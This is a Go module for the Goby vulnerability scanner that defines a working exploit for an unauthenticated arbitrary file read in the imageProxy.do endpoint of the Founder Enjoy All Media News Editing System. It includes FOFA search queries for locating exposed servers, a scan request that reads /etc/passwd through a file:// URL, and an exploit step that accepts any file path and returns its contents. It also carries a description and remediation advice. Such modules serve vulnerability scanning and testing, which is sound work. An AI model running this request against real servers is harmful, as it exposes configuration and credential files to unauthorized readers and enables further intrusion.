package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "Founder Enjoy All Media News Editing System /newsedit/outerfotobase/imageProxy.do File Read Vulnerability",
    "Description": "<p>Founder Enjoy All Media News Editing System is an intelligent integrated media business platform centered on content assets, covering multiple aspects of news production, including planning, collection, editing, publishing, storage, transmission, evaluation, and operation. The imageProxy.do interface of this system has an arbitrary file read vulnerability, allowing unauthenticated attackers to read critical system files (such as database configuration files, system configuration files, etc.), potentially leading to sensitive information disclosure and further threatening system security.</p>",
    "Product": "Founder Enjoy All Media News Editing System",
    "Homepage": "http://www.founder.com.cn/Business/media/Products/mtcp/show/1226.html",
    "DisclosureDate": "2024-12-31",
    "PostTime": "2025-01-02",
    "Author": "2826161446@qq.com",
    "FofaQuery": "body=\"/newsedit/newsedit/css/login_1.css\" || (title==\"方正畅享全媒体报道指挥平台\" && body=\"common/js/jquery.1.7.2.min.js\") || title=\"全媒体采编V3.0-工作平台登录\"",
    "GobyQuery": "body=\"/newsedit/newsedit/css/login_1.css\" || (title==\"方正畅享全媒体报道指挥平台\" && body=\"common/js/jquery.1.7.2.min.js\") || title=\"全媒体采编V3.0-工作平台登录\"",
    "Level": "1",
    "Impact": "<p>This vulnerability allows attackers to read arbitrary files in the system via the imageProxy.do interface, potentially leading to sensitive information disclosure, including database configurations, system configurations, etc., which may be exploited for further attacks such as privilege escalation or remote code execution.</p>",
    "Recommendation": "<p>1. Disable related interfaces exposed to the Internet or set strict access permissions.</p><p>2. Upgrade the system to the secure version provided by the vendor to fix the vulnerability:<a href=\"http://www.founder.com.cn/Business/media/Products/mtcp/show/1226.html\">http://www.founder.com.cn/Business/media/Products/mtcp/show/1226.html</a></p><p>3. Deploy a Web Application Firewall (WAF) to filter malicious requests.</p>",
    "References": [
        "https://axsec.blog.csdn.net/article/details/144857855?spm=1001.2014.3001.5502"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "default,custom",
            "show": ""
        },
        {
            "name": "default",
            "type": "select",
            "value": "/etc/passwd",
            "show": "attackType=default"
        },
        {
            "name": "custom",
            "type": "input",
            "value": "/etc/passwd",
            "show": "attackType=custom"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/newsedit/outerfotobase/imageProxy.do",
                "follow_redirect": true,
                "header": {
                    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                    "X-Requested-With": "XMLHttpRequest",
                    "Accept-Encoding": "gzip, deflate",
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0",
                    "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
                    "Accept": "text/plain, */*; q=0.01"
                },
                "data_type": "text",
                "data": "oriImgUrl=file:///etc/passwd"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "root:x",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/newsedit/outerfotobase/imageProxy.do",
                "follow_redirect": true,
                "header": {
                    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                    "X-Requested-With": "XMLHttpRequest",
                    "Accept-Encoding": "gzip, deflate",
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0",
                    "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
                    "Accept": "text/plain, */*; q=0.01"
                },
                "data_type": "text",
                "data": "oriImgUrl=file://{{{filePath}}}"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "root:x",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|lastbody|regex|([\\s\\S]*)"
            ]
        }
    ],
    "Tags": [
        "File Read"
    ],
    "VulType": [
        "File Read"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "6.5",
    "Translation": {
        "CN": {
            "Name": "方正畅享全媒体新闻采编系统 /newsedit/outerfotobase/imageProxy.do 文件读取漏洞",
            "Product": "方正畅享全媒体新闻采编系统",
            "Description": "<p>方正畅享全媒体新闻采编系统是一款以内容资产为核心的智能化融合媒体业务平台，涵盖新闻生产的多个环节，包括策、采、编、发、存、传、评、营等。该系统的 imageProxy.do 接口存在任意文件读取漏洞，未经身份验证的攻击者可以通过该漏洞读取系统关键文件（如数据库配置文件、系统配置文件等），可能导致敏感信息泄露，进一步威胁系统安全。</p>",
            "Recommendation": "<p>1. 关闭暴露在互联网的相关接口或设置严格的访问权限。</p><p>2. 升级系统至厂商提供的安全版本以修复漏洞：<a href=\"http://www.founder.com.cn/Business/media/Products/mtcp/show/1226.html\">http://www.founder.com.cn/Business/media/Products/mtcp/show/1226.html</a></p><p>3. 部署 WAF（Web 应用防火墙）以过滤恶意请求。</p>",
            "Impact": "<p>该漏洞允许攻击者通过 imageProxy.do 接口读取系统中的任意文件，可能导致敏感信息泄露，包括数据库配置文件、系统配置文件等，进一步可能被利用进行权限提升或远程代码执行。</p>",
            "VulType": [
                "文件读取"
            ],
            "Tags": [
                "文件读取"
            ]
        },
        "EN": {
            "Name": "Founder Enjoy All Media News Editing System /newsedit/outerfotobase/imageProxy.do File Read Vulnerability",
            "Product": "Founder Enjoy All Media News Editing System",
            "Description": "<p>Founder Enjoy All Media News Editing System is an intelligent integrated media business platform centered on content assets, covering multiple aspects of news production, including planning, collection, editing, publishing, storage, transmission, evaluation, and operation. The imageProxy.do interface of this system has an arbitrary file read vulnerability, allowing unauthenticated attackers to read critical system files (such as database configuration files, system configuration files, etc.), potentially leading to sensitive information disclosure and further threatening system security.</p>",
            "Recommendation": "<p>1. Disable related interfaces exposed to the Internet or set strict access permissions.</p><p>2. Upgrade the system to the secure version provided by the vendor to fix the vulnerability:<a href=\"http://www.founder.com.cn/Business/media/Products/mtcp/show/1226.html\">http://www.founder.com.cn/Business/media/Products/mtcp/show/1226.html</a></p><p>3. Deploy a Web Application Firewall (WAF) to filter malicious requests.</p>",
            "Impact": "<p>This vulnerability allows attackers to read arbitrary files in the system via the imageProxy.do interface, potentially leading to sensitive information disclosure, including database configurations, system configurations, etc., which may be exploited for further attacks such as privilege escalation or remote code execution.</p>",
            "VulType": [
                "File Read"
            ],
            "Tags": [
                "File Read"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Variables": {
        "filePath": "switch|attackType|{{{default}}}"
    },
    "VariablesOrder": [
        "filePath"
    ],
    "EditType": "fast",
    "PocId": "9981"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}
